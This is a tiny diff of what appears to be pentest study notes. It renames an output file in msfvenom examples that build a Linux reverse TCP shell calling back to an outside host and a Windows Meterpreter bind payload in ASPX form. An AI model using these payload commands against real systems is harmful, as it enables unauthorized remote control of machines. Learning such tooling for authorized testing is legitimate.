@@ -46,7 +46,7 @@ msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
 msfvenom -p linux/x64/shell/reverse_tcp lhost=192.66.166.2 lport=443 -f elf -o newfile
 
 # Example of a windows staged payload
-msfvenom -p windows/x64/meterpreter/bind_tcp lhost=10.10.14.72 lport=1234 -f aspx -o lal
+msfvenom -p windows/x64/meterpreter/bind_tcp lhost=10.10.14.72 lport=1234 -f aspx -o lala
 ```
 
 
